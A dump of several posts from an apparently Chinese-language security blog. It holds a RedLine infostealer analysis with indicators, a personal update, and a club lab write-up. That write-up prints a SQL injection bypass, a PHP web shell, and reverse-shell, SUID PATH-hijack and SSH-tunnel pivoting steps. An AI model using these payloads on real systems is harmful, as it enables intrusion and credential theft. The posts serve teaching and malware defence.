[{"categories":["資訊安全 Cyber Security"],"content":"你已成為盜版的受害者。 雖然 GitHub 提倡的開源文化是可受大眾公開檢視，但不代表就是 100% 安全。 以上截圖是用 Google Search Free-Download-2023 site:github.com 找到的一小部分 repo，沒意外裡面都埋藏惡意軟體，這些可疑 repo 的特色是出現時間很短，大概兩三天就會消失，一旦下載後執行就會有資料外洩的疑慮，雖然客家人都不太喜歡買正版，但找盜版也要注意安全R ","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:0:0","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["資訊安全 Cyber Security"],"content":"What’s Happen OK，事情的發生就是身邊朋友在 8/18 從類似上述的 repo 下載到惡意軟體，結果沒幾天信箱開始收到異常登入的通知，原本的惡意 GitHub repo (https://github[.]com/Munganyende/MOVAVI-VIDEO-EDITOR-PLUS-CRACK-2023-14737) 在我接到消息時，發現 Owner 已經關帳號了，可見有多可疑== 之後我用相同的關鍵字找到類似的 repo（但寫文當下這 Owner 也關閉了），截圖如下。 除了 README 看起來就很可疑，另外注意到右上的 Star 居然有 54 顆 （我好羨慕），仔細看裡面每個點星星的帳號也都是做類似的散播惡意程式，只是換個不同的商業軟體名稱，內容大同小異。 點下 Download 後會連去 Godaddy 的網址，然後轉址到 discordapp 的連結，攻擊者似乎是統一放在 Discord 再拿連結出來散播，而這兩者都是合法的網路平台，實在防不勝防。 hxxps[:]//launchersoftware.godaddysites[.]com/ hxxps[:]//cdn.discordapp[.]com/attachments/1042051714754289756/1143174795983343656/Setup.zip ","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:1:0","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["資訊安全 Cyber Security"],"content":"Malware Analysis 把壓縮檔 unzip (password: 8848) 後可以看到不少檔案，雖然事隔多日當事人對檔案表示沒什麼印象，就姑且拿來看看吧 : 3 入口點不意外就是那個 Setup.exe，但是用 IDA 追了一陣子沒看出甚麼端倪，倒是注意到 Exports 那邊都是以 go 為開頭的函式，拿去 Google 後可以找到 GLFW 這個專案，所以可以知道這隻 .exe 是用 Golang 編譯的，但是在 function list 中並沒有看到 main.main 這類的 Golang 特徵，同時用 Mandiant 的 GoReSym 也沒有還原出其他東西 （error message: Failed to parse file: failed to read pclntab: failed to locate pclntab），用 go_parser 拆也得到 Exception: Failed to find firstmoduledata address!，感覺該找個時間研究怎麼拆 Golang-based program（沉默） 既然靜態看不懂，那就直接開 Debugger 跑動態，發現他會 drop 出一隻 .NET 後門 %AppData%\\Local\\Temp\\dfb5cc44a3e2a1762bc0f637ae29ffb43353755425，並且在執行結束後自刪。 用 CFF Explorer 打開注意到該檔案 internal name 為 Radiogram.exe ，在 VirusTotal 上搜尋 name:Radiogram.exe 發現樣本還不少，而且大部分的 engine 的 detection name 為 RedLine Stealer。 簡單用 dnSpy 瞄了一下，有些奇怪的 function name 居然是用哈薩克文寫的（by Google Translate），像是下面這個 function name 意思是 “check bot”，可以知道在以下條件會觸發 sleep 並結束程式。 另外就是從網路上取得後續的 payload ，正好該有的資訊都寫在裡面，照著走會得到一個網址 hxxps[:]//pastebin[.]com/raw/tnW31tPp ，並且可以把裡面的 payload 抓下來。 Config Decryption algorithm CyberChef pastebin.com 是個公開程式碼分享平台，毫不意外地被攻擊者拿來當作後續攻擊的媒介。 而目前該網址 /tnW31tPp 已被通報，所以下架了。 Not Found (#404) This paste has been deemed potentially harmful. Pastebin took the necessary steps to prevent access on August 25, 2023, 12:55 am CDT. If you feel this is an incorrect assessment, please contact us within 14 days to avoid any permanent loss of content. 而我們拿到的 payload Nj9QUisHPA83L1AfKwc8ETcsBh4oLQ1TGg9UWg== 可以用同一組 XOR Key 得到最後的 C2 server =\u003e moy.tapoq[.]top:28786 (IP: 95.216.180[.]12)。 不過有趣的是，同一個 /tnW31tPp 網址從 VirusTotal 可以找到不同的 payload ，表示攻擊者一直都是用相同網址去更新 C2 server 的位址，從收集來的 payload 可以再找到幾台 C2 server。 ley.domest[.]top:28786 (IP: 95.216.180[.]12) gog.shopapi[.]top:28786 (IP: 95.216.180[.]12) m6o.braavaw[.]top:28786 (IP: 185.229.64[.]67) 共通點除了都是使用 Port 28786，以及註冊便宜的 .top TLD ，其中還有兩台跟本案的 C2 server 是同一組 IP。 其他一些功能從 function name 就能略知一二的了，並且大部分的 command 都有簡易混淆。 CryptoHelper 觀察到有疑似摳解密的 API ，猜測可能是在機器上把撿到的 credential 解完再傳回 C2 server，圖中的各種 MSValue* 可以對應到下方網路流量的使用，總之就是各種偷 login data, cookies, Web Data, localprefs.json, …etc.。 SystemInfoHelper GetProcessors (SELECT * FROM Win32_Processor) GetGraphicCards (SELECT * FROM Win32_VideoController) GetBrowsers (check SOFTWARE\\\\WOW6432Node\\\\Clients\\\\StartMenuInternet, SOFTWARE\\\\Clients\\\\StartMenuInternet) GetSerialNumber (SELECT * FROM Win32_DiskDrive) ListOfProcesses (SELECT * FROM Win32_Process Where SessionId=) GetVs (check AntivirusProduct, AntiSpyWareProduct, FirewallProduct) GetProcessesByName (SELECT * FROM Win32_Process Where SessionId=') ListOfPrograms (check SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall) AvailableLanguages CollectMemory (SELECT * FROM Win32_OperatingSystem) GetWindowsVersion (check SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion) 最後，從網路流量來看… 嗯 應該也不太需要多做解釋了。 紅字是電腦發出去的 request，藍字則是對方下達的指令，可以看到基本上裝置裡所有文字檔、錢包位址等等都會被傳回去，其他一些存在各式瀏覽器的資訊，還有針對加密貨幣的 plugin，這些被拿走就真的很麻煩呢QQ ↓↓↓ 簡單整理如下 ↓↓↓ %USERPROFILE%\\Desktop|*.txt,*.doc*,*.rdp,*.key*,*wallet*,*seed*|0 %USERPROFILE%\\Documents|*.txt,*.doc*,*.rdp,*key*,*wallet*,*seed*|0 %appdata%\\binance|*.fp*|0.E...c. %USERPROFILE%\\AppData\\Local\\Battle.net %USERPROFILE%\\AppData\\Local\\Chromium\\User Data %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data %USERPROFILE%\\AppData\\Local\\Google(x86)\\Chrome\\User Data %USERPROFILE%\\AppData\\Roaming\\Opera Software\\ %USERPROFILE%\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data %USERPROFILE%\\AppData\\Local\\Iridium\\User Data %USERPROFILE%\\AppData\\Local\\7Star\\7Star\\User Data %USERPROFILE%\\AppData\\Local\\CentBrowser\\User Data %USERPROFILE%\\AppData\\Local\\Chedot\\User Data %USERPROFILE%\\AppData\\Local\\Vivaldi\\User Data %USERPROFILE%\\AppData\\Local\\Kometa\\User Data %USERPROFILE%\\AppData\\Local\\Elements Browser\\User Data %USERPROFILE%\\AppData\\Local\\Epic Privacy Browser\\User Data %USERPROFILE%\\AppData\\Local\\uCozMedia\\Uran\\User Data %USERPROFILE%\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer %USERPROFILE%\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data %USERPROFILE%\\AppData\\Local\\Coowon\\Coo","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:2:0","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["資訊安全 Cyber Security"],"content":"In Closing 根據一些在網路上的資料，沒意外這隻就是 RedLine Stealer 了，原本想說哪可能這麼容易就撿到惡意程式，沒想到這查下去就是一串粽子XDDD 不過根據中獎的那位朋友表示，這陣子除了一直收到可疑的登入通知，在 Steam 方面即便之前就綁 Steam Guard ，但關鍵時刻卻還是沒有跳出來 2FA ，帳號就這樣直接被拿去亂傳訊息，在猜想是否因為存在瀏覽器的資訊被拿走，讓攻擊者可以直接用 session 做登入嗎，嗯 … 好微妙。 至於事發兩天後我用同樣的 free-download 關鍵字在 Google Search 看到其他 GitHub repo 以不同的壓縮密碼散播 CPP-based 的惡意程式，那又是另一個故事了… ","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:3:0","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["資訊安全 Cyber Security"],"content":"Reference Takedown of GitHub Repositories Disrupts RedLine Malware Operationstakedown-of-github-repositories-disrupts-redline-malware-operations/ Destroying Redline Stealer and CypherIT eSentire Threat Intelligence Malware Analysis: Redline Stealer Malware-as-a-Service: Redline Stealer Variants Demonstrate a Low-Barrier-to-Entry Threat RedLine Technical Analysis Report (web archive) Malicious AI Tool Ads Used to Deliver Redline Stealer 駭客將可竊取機密資訊的RedLine Stealer偽裝成Windows 11更新程式 習慣用 Chrome 記住密碼，遠端工作恐成駭客破口 ","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:4:0","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["資訊安全 Cyber Security"],"content":"IOCs Indicator Description f9186767c98490db03a70f511cb24a84eb906c94 Setup.zip ab741ccd807f6645c15aa9d69666b04ea8e6d408 Setup.exe 73ceacde9d7b7ede1c4b7615c1bd5ae2ace45b97 Radiogram.exe (filename: dfb5cc44a3e2a1762bc0f637ae29ffb43353755425) hxxps[:]//launchersoftware.godaddysites[.]com/ The link redirect to discord link hxxps[:]//cdn.discordapp[.]com/attachments/ 1042051714754289756/1143174795983343656/Setup.zip Download link hxxps[:]//pastebin[.]com/raw/tnW31tPp The site to store subsequent payload moy.tapoq[.]top:28786 C2 Server 95.216.180[.]12 C2 Server ","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:5:0","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["資訊安全 Cyber Security"],"content":"Suspicious GitHub Users @hiinoo01aiiu, Joined on Aug 29, 2021 @MinhGachaCoder, Joined on Mar 12, 2023 @elvisEam, Joined on Jun 8, 2022 @MarkRoi, Uganda - Kampala @Mr-krostopbey1903, Joined on Jan 29, 2021 @tccpro, Freelance @Shopify @qarixaeed1, Joined on Aug 1, 2022 @Kashif818Mehmood, Joined on Jun 28, 2020 @TGRedDragon, Joined on Mar 19, 2023 @llstevenll, Joined on Oct 17, 2022 @RobinHuaman, Joined on Sep 4, 2021 @Masterkent11, Joined on Jul 9, 2019 @laoluibitoye, Joined on Jul 25, 2019 @gl0nDbeatz, Joined on Jul 28, 2023 @Issoufouiha, Niamey @nazadam, Joined on Sep 27, 2022 @A-mal, Joined on Jun 6, 2021 @X-vinjin, Joined on Dec 6, 2022 @theillumina, Joined on Mar 26, 2023 @Sazzadur1991, Joined on Aug 4, 2023 @GitTrio3, Joined on Jun 7, 2023 @UnknownKingsy, Joined on Jan 25, 2021 @Kyori4k, Joined on Oct 28, 2022 @Developwithjaspreet, wpcodekit @ajivijay, Joined on Jul 1, 2023 @soporteint2023, Joined on Apr 27, 2023 @KojoClinton, Joined on Jul 10, 2023 @intel1337, Selfish @Kirarik21, Joined on Jun 10, 2023 @Emrx29y, Joined on Feb 26, 2023 @Clemens17, Joined on Nov 15, 2022 @Elissonamarodasilva, Joined on Feb 11, 2023 @Mcbrightyves, Joined on Oct 17, 2022 @wxmcode, Joined on Sep 3, 2019 @Aramayis1996, Joined on Nov 27, 2022 @yuanxiangliu, Joined on Aug 18, 2022 @ohTraveler, Joined on Aug 15, 2023 @Ladicor, Joined on Mar 1, 2022 @alexanderutmn, Joined on Apr 1, 2017 @guru9999, Joined on Aug 6, 2017 @MakareB, Joined on May 12, 2021 @olikke, Joined on Dec 11, 2018 @twirus7, Joined on Apr 13, 2023 @BabyNelo, Joined on Mar 21, 2023 @saintsblack, Joined on Mar 4, 2023 @un243alexxx, Joined on Nov 29, 2020 @gingazov2010, Joined on Nov 9, 2019 @dasdeutchguy, Joined on May 28, 2023 ","date":"2023-08-26","objectID":"/posts/2023/redline-infostealer-analysis/:5:1","tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] 難道這是免費可以看的嗎？ RedLine InfoStealer","uri":"/posts/2023/redline-infostealer-analysis/"},{"categories":["生活札記 Free Writing"],"content":"畢業後開始社畜生活，然後被抓去剃光頭為國效勞四個月，回公司後不久又接著受訓一個月。 一年真的轉眼就過去了。 ","date":"2023-07-07","objectID":"/posts/2023/2023h1-sharing/:0:0","tags":["日常閒聊","Malware Analysis","FFXIV"],"title":"[2023H1 雜談] 嘿！我回來了","uri":"/posts/2023/2023h1-sharing/"},{"categories":["生活札記 Free Writing"],"content":"162T 我新訓的單位在成功嶺 101R4BFC，下部隊則在桃園 269R3B1C。 如果在關注新聞的話，會看到在我當兵這段期間連上有出大事，而且是那種會出現幾位梅花等級的那種。 簡單講就是有鄰兵睡一睡就離世，當時還適逢鑑測週，搞得大家人仰馬翻QQ 說起來算算距離退伍也過了 4 個月，有些事想起來開始會懷念了，尤其每次的休假時間總是特別珍貴XD 總之如各位學長們所言，軍裡什麼鬼故事都有，而且我還在 1/3 弟兄都確診的環境下完美迴避 COVID-19，平安地結束役期！ ","date":"2023-07-07","objectID":"/posts/2023/2023h1-sharing/:1:0","tags":["日常閒聊","Malware Analysis","FFXIV"],"title":"[2023H1 雜談] 嘿！我回來了","uri":"/posts/2023/2023h1-sharing/"},{"categories":["生活札記 Free Writing"],"content":"Back2Office 據說在我當兵期間，公司對 WFH 的政策朝令夕改，我回來參加的第一次 all-hands 就聽到上級各種道歉，不過對於過去在實驗室人稱地伏靈的我，如果要每天到公司也沒什麼難度就是了。 回公司的前一晚剛好是公司春酒晚會，感謝同事讓我能夠當點心小偷 在熟悉一陣子 team 上的業務後，接著就是 virus training 了。 ","date":"2023-07-07","objectID":"/posts/2023/2023h1-sharing/:2:0","tags":["日常閒聊","Malware Analysis","FFXIV"],"title":"[2023H1 雜談] 嘿！我回來了","uri":"/posts/2023/2023h1-sharing/"},{"categories":["生活札記 Free Writing"],"content":"Malware Analysis Training 由於工作業務上會接觸到大量病毒樣本，所以在正式上工前必須通過公司安排的 Malware analysis training。想當然爾，通過 final exam 也就是我們 team 的其中一個適用期條件，沒錯！我從當兵前入職，到回公司參加 training 都還在適用期間，其實某方面也蠻感謝公司肯花錢花時間讓我學習一些惡意程式分析的基礎，甚至還讓我 LOA 去當兵再回來。 咳、扯遠了。 總之，為期一個月的 Training 主要是學習各種 Malware 種類的分析，以及一些工具的使用。回想起過去打 CTF 的日子，我總是把 Pwn 和 Reverse 交給 @stavhaygn，幾乎很少有機會學習使用 IDA 神器，不然就是 F5 秒解。總之，從前輩們打聽到課程內容非常扎實，甚至去年參加的同事還說老師教課進度飛快，對新手不太友善QQ 所幸，這次老師不但有換人，而且還一次換成三位菲律賓籍老師（聽說是去年很缺授課老師XDDD），而且感覺得出來老師們很用心備課，雖然作業量看起來跟往年一樣多到寫不完，每次檢討還會隨機抽學生分享畫面講解（in English），真的壓力山大XDDDD 另外一個幸運的是， team 裡今年報到的新人是 senior 等級，實力從第一週上課就高下立判，明顯感受我跟他的經驗差距之大，有時候我看很久的 disassembled code，他只看一眼就說是某種加解密不用看這麼細，也因此讓我漸漸可以抓到分析的節奏，畢竟在有限的時間真的不可能每個函式都點進去看。 感謝這位同事，帶著我和其他 team 一起來上課的同事平安度過 training，而且 final exam 在週五（後天是公司的運動會活動），老師最後把交卷時間拉長到整個週末，考試當天我坐一整天好不容易交卷聽到延長都傻眼，太 NICE 了吧XDDD ","date":"2023-07-07","objectID":"/posts/2023/2023h1-sharing/:3:0","tags":["日常閒聊","Malware Analysis","FFXIV"],"title":"[2023H1 雜談] 嘿！我回來了","uri":"/posts/2023/2023h1-sharing/"},{"categories":["生活札記 Free Writing"],"content":"Tech Industry Downturn 每個人對於畢業後的規劃不同，但從 2022H2 到今年從許多新聞可以看到科技業寒冬的影響，一些 Big Tech 裁員的消息讓人很是擔心，有點慶幸自己在畢業前就找到工作，雖然沒找到研替還是有點小遺憾，畢竟走四個月正常役還是有被教召的可能，想想就頭疼。 我在入職的這段期間也透過 referral program 內推了幾位朋友，但目前都因為人事凍結或只招 senior 等級的即戰力，想想也是替朋友們感到可惜，這段期間要找自己理想的工作不容易啊。 ","date":"2023-07-07","objectID":"/posts/2023/2023h1-sharing/:4:0","tags":["日常閒聊","Malware Analysis","FFXIV"],"title":"[2023H1 雜談] 嘿！我回來了","uri":"/posts/2023/2023h1-sharing/"},{"categories":["生活札記 Free Writing"],"content":"FINAL FANTASY XIV （會看我的文章的人應該都玩完 6.0 不會介意我暴雷吧） FFXIV 主線的劇情大概從去年當兵前的 5.0 (ING) 到今年五月才終於把 6.0 走完，真的是很讚的故事。 尤其在補了一些關於過去被消滅的 1.0 (2010-2012) 歷史事蹟，看著曾經要收掉的遊戲在吉田桑的接手救援下砍掉重練，推出了全新的 2.0 並持續優化改善，到現在 6.4 幾乎是一致的好評，真的很不容易，尤其是用 1.0 的故事設定（衛月事件）鋪陳 2.0 的這段真心覺得厲害。 如果有興趣的玩家，我非常建議可以了解這款遊戲的前因後果 The Fall and Rise of Final Fantasy XIV - Youtube ，Bilibili 也有授權翻譯的版本可以看 FF14衰落与重生(Fall\u0026Rise) - bilibili，如果跑完主線再回頭看應該會很有感觸。 另外，每個版本的故事其實也都還有一些官方的讀物（FINAL FANTASY XIV Side Stories / 最终幻想14 游戏设定特别读物）可以看，當兵的期間我還印出來在裡面把 2.0 - 4.0 的番外篇讀完，一些角色之間的互動和小設定真的很有趣XD 雖然現在話題正夯的是 PS5 的 FFXVI，但 FFXIV 也讓我夠繼續玩好一陣子了～ ","date":"2023-07-07","objectID":"/posts/2023/2023h1-sharing/:5:0","tags":["日常閒聊","Malware Analysis","FFXIV"],"title":"[2023H1 雜談] 嘿！我回來了","uri":"/posts/2023/2023h1-sharing/"},{"categories":["資訊安全 Cyber Security"],"content":"久違的社課，這次是 MacacaHub 現役成員 @Arikoi 談內網滲透。 整場聽下來發現自己太多觀念不熟，所以盡可能將過程整理，有任何錯誤還請不吝指教！ ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:0:0","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"事前資訊 由於這堂某種程度算是內網滲透的簡單範例，所以開頭就給了不少資訊。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:1:0","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"網站資訊收集 出發點是一個簡陋的網站，從選單可以簡單知道該站的基本功能，同時發現 FileUpload 不開放給非 admin 使用者。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:2:0","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"SQL Injection 首先我們可以從登入下手，會被導去一個登入頁（沿用之前的社課教材XD），很明顯是個 SQLi 的洞，還附了 Magic 給你 debug。 這時講師提供了一組 guest:guest 作為提示，登入後可以發現上方會是 “Welcome guest”。 如果用 ' or 1=1 -- 可以成功登入，但是由於 admin 並不在資料庫第一筆，因此就算條件為 True 也不會是以 admin 登入。這邊的考點要用 UNION 的方式繞過，但講師把驗證的部分寫壞了，所以 admin'; -- 可以繞過XD 預期解法可以用 LIMIT 1,1 -- 找下一筆查詢結果，或是用 UNION 猜欄位數量後，再透過 “Welcome ” 來判斷要把 admin 塞在哪一個位置（當然全塞也是會過啦），密碼可留空。 'UNION SELECT 'a', 'admin', 'a' ; -- ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:2:1","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"Unrestricted File Upload 成功以 admin 登入，下一步可以嘗試上傳檔案。 該功能的用途是上傳圖片並顯示在首頁中，因此若非允許的副檔名會被擋下來。 給各位參考資安社社員們都傳了什麼圖www 上傳後的圖片在首頁點開會發現路徑存在 ./uploads/\u003cfilename\u003e.jpg。 用 F12 可以從前端找到前端驗證 fileValidation.js ，從 source code 可以想到要繞過驗證並嘗試上傳 web shell。（原本在驗題的時候函式似乎沒有放 const ，所以可以直接從前端拔掉驗證的部分XD） web shell 的部分並沒有擋太多，用最簡單的 PHP web shell 就行了（副檔名為 .png）。 \u003c?php echo shell_exec($_GET['cmd'], '2\u003e\u00261'); 驗證繞過的部分，預期解是直接開 Burp Suite 攔截修改副檔名即可。 題外話，最新版的 Burp Suite 居然有內建 chrominum 不用另外設定 proxy ，大推!! 之後可以透過剛剛上傳的檔案路徑執行我們的 web shell。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:2:2","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"Reverse Shell 用 web shell 雖然可以下指令翻閱 web server 底下的檔案，但並不會保留 session ，因此沒辦法 cd 到其他路徑。甚至是在 cat 一些 php 檔案也不會直接顯示 source code ，這時候就可以用 Reverse Shell 的方式讓 web server 主動向我們連線。 這裡使用 Reverse Shell Generator 自動產生連線所需要的 code ，要注意的是若沒有實體 IP 的話，講師當時有提供 Kali 可以 SSH 進去用內網 IP（這部分我使用實驗室的實體 IP）。 在 Host 使用右上的指令進行 LISTEN。 在 web shell 使用下方的指令，左側可以依據 server 選擇連線工具（有時候需要多測幾個，這裡用 nc -c 可以成功連線）。 成功的話 Local 就會彈出 Reverse Shell ，可以下一些指令挖看看有什麼有趣的資訊。 可以發現一些網站的 source code，其中在 login.php 可以進一步翻到寫在 connect.php 的 資料庫 資訊。 有了資料庫的登入資訊，也確認有 mysql 可用，就可以直接用指令翻資料庫的內容了，格式如下。 $ mysql –h SERVER –u USER –pPASSWORD DATABASE -e \"show tables;\" 關於 `mysql` 幾個雷點 密碼的部分 -pPASSWORD 中間沒有空白。 由於指令打錯不會噴任何訊息，建議要加 -e \"\u003ccommand\u003e;\"，同時分號記得掛上去。 MacacaHub{db-secret-2553a38af63eb376ba770668e81045dc} 在資料庫除了拿到 Flag， 還順便撿到了一組可登入的使用者 macaca:mhub（關於這個使用者的存在，可以透過指令 last 或 /etc/passwd 觀察）。 危險 弱密碼 Bad ， 而且資料庫勿存密碼明文。 另外還可以用 ip addr 瞭解網卡資訊，可以看到除了目前網段 10.0.20.0/24 ，還有之後會用到內網網段 10.255.0.0/24。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:2:3","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"SUID Privilege Escalation 在 web server 裡除了一些 PHP 的 source code，還有一個令人感興趣的 .c，這個其實是能在 Linux 利用環境變數的 SUID 提權，但有鑒於社課時間不夠，這部分就被講師跳過了有點可惜QQ 有興趣可以參考 Linux提权之SUID 起手式，檢查有沒有奇怪的檔案，這裡用 find 找到具有 SUID 權限的程式 showErrorLog。 $ find . -perm -u=s -type f 2\u003e/dev/null 根據講師提供 .c source code，可以發現程式為了用 tail 存取 /var/log/ 底下需要 root 權限的檔案，前面掛上了 SUID 。 這時候我們可以利用偽造 tail 並加入環境變數的方式，讓 showErrorLog 執行我們想要的指令，具體作法如下。 找一個可以寫入的目錄，最常被拿來寫入的是 /tmp ，因此我們把 “/bin/bash” 寫進 /tmp/tail，並寫給他執行權限 777（或是 +x 也行）。 把目錄 /tmp 寫進環境變數 $PATH。 如此一來，執行 showErrorLog 後系統會先找到存放在 /tmp 的 tail，並且執行 /bin/bash ，直接取得 root 的 shell !! 下圖為了方便截圖，重開新的 session，並分段提高可讀性（Ｏ 找到在 /root 偷埋的 flag。 MacacaHub{env-privilege-b68a4679b5a2e1aaa00dc3ffa8ed429c} ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:2:4","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"內網滲透 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:3:0","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"SSH Tunneling 一般來說，SSH 是被允許通過防火牆或是 DMZ ，而且 SSH 的傳輸過程都是加密的，因此很容易被駭客拿來利用，在這次社課主要就是以 SSH Tunneling 搭配之後的 ProxyChains 來透過 web server 進入內網。關於 SSH Tunneling 這裡只介紹 Dynamic Port Forwarding，其他有興趣的可以參考 SSH Tunneling (Port Forwarding) 詳解。 Dynamic Port Forwarding 由於我們等等需要以 nmap 掃內網，因此選擇 Dynamic Port Forwarding 在 web server 啟動 SOCKS 代理伺服器，這樣就能以不指定 Port 的方式用 nmap 找有開啟服務的 Port。至於要登入的帳號就是前面從資料庫撿到的 macaca:mhub。 (host)$ ssh -D [client:]\u003cport\u003e \u003cSSH server\u003e 小提醒 由於講師整個服務只有 Port 80 對外開放，因此需要透過 VPN 先跳 DMZ 進去再建 SSH Tunneling，之後如果 web server 有開 SSH 就不用 VPN 了。 SSH Tunneling 這裡只負責建立通道，因此 SSH 參數可以加上 -N 不顯示其他 prompt 資訊（可以比較下圖和之後 ProxyChains 的作法）。 ProxyChains 預設走 Port 9050，因此在 SSH 連線直接 bind Port 9050。 若要用其他的 Port ，可以到 /etc/proxychains.conf 修改。 這邊都在 host 下指令，可以開兩個 terminal 進行觀察（這邊我用 tmux 切成左右畫面）。 左邊的畫面先使用 WireGuard VPN 跳進 DMZ，然後進行 Dynamic Port Forwarding，輸入密碼後就成功建立 SSH Tunneling，之後卡著不用動。 之後的操作主要都是以右邊的畫面為主，可以先用 netstat 檢查看看是否有在 LISTEN Port 9050。 2022.4.26 UPDATE 老實說，拿到 web shell 後還要 VPN 跳到 DMZ 建 SSH tunneling 這件事，不是很 real world。 課堂上原本有教使用 SSH remote 的連線方式，在拿到 web shell / reverse shell 從 web server 主動向 local 建立 SSH tunneling，但是會遇到 SSH 需要輸入密碼的互動環節而卡關，這個問題可以搭配 passh 連同密碼直接向 local 建立 SSH tunneling （但明文密碼會不會被網管反過來利用就不好說了，保重）。 此外，也可以用 SSH 以外的方式建立 tunneling，例如 reGeorg，重點就是如何讓 local 和 DMZ 之間建立連線，再透過 ProxyChains 滲透到內網中。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:3:1","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"ProxyChains 成功建立 SSH Tunneling 後，我們就能藉由 ProxyChains 透過 host 的 Port 9050 下指令到 web server。 我們可以用之前在 reverse shell 撿到的內網網段 10.255.0.0/24 ，在右邊畫面使用 nmap 掃掃看有沒有開 Port 22 的主機。 (host)$ proxychains nmap -p 22 10.255.0.0/24 --open 使用情況如下圖，可以發現左邊也會收到 nmap 的結果，此屬正常情況（若覺得礙眼，也可以在建 SSH Tunneling 階段用 -f 放到背景執行）。 直接掃應該會需要不少時間，何況 nmap 掃 IP 居然是跳著掃Orz 沒意外的話，最後可以掃到 10.255.0.10 有開 Port 22 服務。 如此一來我們就可以利用 ProxyChains 直接 SSH 連進內網主機了。 課程至此完成內網滲透，之後就是從內網主機的資訊決定下一步要怎麼走了。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:3:2","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"Bonus ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:4:0","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"Another Privilege Escalation 原本是講師覺得內網沒東西很奇怪，所以硬是放了一個神奇的提權漏洞，有興趣可以參考 Linux Privilege Escalation using Sudo Rights。事實上社課也是把前面的 SUID 提權跳過才勉強講完，真的是蠻可惜的QQ 首先，進入內網主機後，用 sudo -l 查看 macaca 可以執行的指令，發現有幾個限定的指令包括 less、man、python、perl。 